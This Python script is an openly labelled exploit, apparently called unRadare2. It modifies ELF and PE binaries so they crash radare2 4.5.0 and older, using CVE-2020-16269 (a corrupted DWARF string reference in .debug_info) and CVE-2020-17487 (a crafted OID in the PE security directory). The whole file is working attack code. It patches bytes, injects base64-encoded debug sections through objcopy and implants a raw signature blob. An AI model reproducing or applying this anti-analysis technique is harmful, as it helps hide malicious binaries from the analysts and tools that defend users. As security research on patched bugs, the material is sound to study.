#!/usr/bin/python3

from elftools.elf.elffile import ELFFile
from elftools.elf.enums import ENUM_E_MACHINE
import sys
import pefile
import struct
import argparse
import os
import base64

# Those vulnerabilities were patched, they only work for a version of radare2 <= 4.5.0

# for ELF:
# trigger a segfault in radare2 by modifing a DW_FORM_strp (a reference to a string in the dwarf debug format) (modify the shift in DW_AT_name)
# (exploit the CVE-2020-16269)
# for PE:
# trigger a segfault in radare2 by modifing the Object Identifier in IMAGE_DIRECTORY_ENTRY_SECURITY (in PE files)
# bugs found by S01den and Architect (with custom fuzzing)
# (exploit the CVE-2020-17487)

def get_offset(fname):
    pe = pefile.PE(fname, fast_load = True)
    pe.parse_data_directories( directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']])

    sig_offset = 0
    found = 0

    for s in pe.__structures__:
        if s.name == 'IMAGE_DIRECTORY_ENTRY_SECURITY':
            sig_offset = s.VirtualAddress
            print("[*] IMAGE_DIRECTORY_ENTRY_SECURITY offset = "+hex(sig_offset))
            sig_len = s.Size
            print("[*] Size: "+hex(sig_len))
            if(sig_len <= 0):
                sig_offset = 0

    pe.close()

    return sig_offset

print("__________                       _____  ________   _____  _________                      .__     ")
print("\______   \_______  ____   _____/ ____\ \_____  \_/ ____\ \_   ___ \____________    _____|  |__  ")
print("|     ___/\_  __ \/  _ \ /  _ \   __\   /   |   \   __\  /    \  \/\_  __ \__  \  /  ___/  |  \  ")
print("|    |     |  | \(  <_> |  <_> )  |    /    |    \  |    \     \____|  | \// __ \_\___ \|   Y  \ ")
print("|____|     |__|   \____/ \____/|__|    \_______  /__|     \______  /|__|  (____  /____  >___|  / ")
print("                                                \/                \/            \/     \/     \/ ")


if(len(sys.argv) < 2):
	print("Command: ./unRadare2.py -elf file_to_patch or -pe file_to_patch")
	exit()

filename = sys.argv[2]

if(sys.argv[1] == "-elf"):
	found = 0

	file = open(filename,"rb")
	binary = bytearray(file.read())
	elffile = ELFFile(file)

	offset_section_table = elffile.header.e_shoff
	nbr_entries_section_table = elffile.header.e_shnum

	for section in elffile.iter_sections():
		if(section.name == ".debug_info"):
			print("[*] .debug_info section f0und at %s!" % hex(section['sh_offset']))
			found = 1
			break

	if(found):
		offset_dbg = section['sh_offset']
		binary[offset_dbg+0x31] = 0xff
		new_filename = filename+"_PoC"
		new_file = open(new_filename,"wb")
		new_file.write(binary)
		new_file.close()

		print("[*] ELF patched ! ----> "+new_filename)

	else:
		comment_section = 0
		shstrtab_section = 0

		print("[!] No .debug_info section f0und :(")
		print("[*] So let's add it !")

		bin_abbrev = base64.b64decode("AREBJQ4TCwMOGw4RARIHEBcAAAIWAAMOOgs7C0kTAAADJAALCz4LAw4AAAQkAAsLPgsDCAAABQ8ACwsAAAYPAA==")
		bin_info = base64.b64decode("OAAAAAQAAAAAAAgBowAAAATXDQAAhxcAAM0OQAAAAAAAYCAAAAAAAAAAAAAAAjAAAAAD1DgAAAADCAcyFQAAAwEI")

		open("tmp_info", "wb").write(bin_info)
		open("tmp_abbrev", "wb").write(bin_abbrev)

		cmd_1 = "objcopy --add-section .debug_info=tmp_info "+filename
		cmd_2 = "objcopy --add-section .debug_abbrev=tmp_abbrev "+filename

		os.system(cmd_1)
		os.system(cmd_2)
		os.remove("tmp_info")
		os.remove("tmp_abbrev")
		print("[*] ELF patched ! ----> "+filename)

	file.close()

elif(sys.argv[1] == "-pe"):
	sig_offset = get_offset(filename)

	f = open(filename,'rb')
	content = bytearray(f.read())
	f.close()

	if(sig_offset == 0):
	    print("[!] Nothing found... Trying to implant anyway")
	    i = 0
	    exploit = b"\x80\x08\x00\x00\x00\x00\x02\x000\x82\x08s\x06\t*\x86H\x86\xf7\r\x01\x07\x02\xa0\x82\x08d0\x82\x08`\x02\x01\x011\x0b0\t\x06\x05+\x0e\x03\x02\x1a\x05\x000h\x86\n+\x06\x01\x04\x01\x827\x02\x01\x04\xa0Z0X03\x06\n+\x06\x01\x04\x01\x827\x02\x01\x0f0%\x0b\x01\x00\xa0 \xa2\x1e\x80\x1c\x00<\x00<\x00<\x00O\x01b\x00s\x00o\x00l\x00e\x00t\x00e\x00>\x00>\x00>0!0\x0b\x22"

	    while i != len(content)-123:
	        if content[i:i+123] == b"\x00"*123:
	            print(f"[*] Found space at {hex(i)}")
	            break
	        i += 1

	    pe = pefile.PE(filename, fast_load = True)

	    for s in pe.__structures__:
	        if s.name == 'IMAGE_DIRECTORY_ENTRY_SECURITY':
	            s.VirtualAddress = i
	            s.Size = 0x880
	            pe.set_bytes_at_offset(i, exploit)

	    pe.write(filename="output.exe")

	else:
	    print("[*] OID found !: "+hex(content[sig_offset+0x7a]))
	    content[sig_offset+0x7a] += 1
	    f = open("output.exe",'wb')
	    f.write(content)
	    f.close()

	print("[*] D0ne ! ----> output.exe")

else:
	print("[!] Invalid argument !")
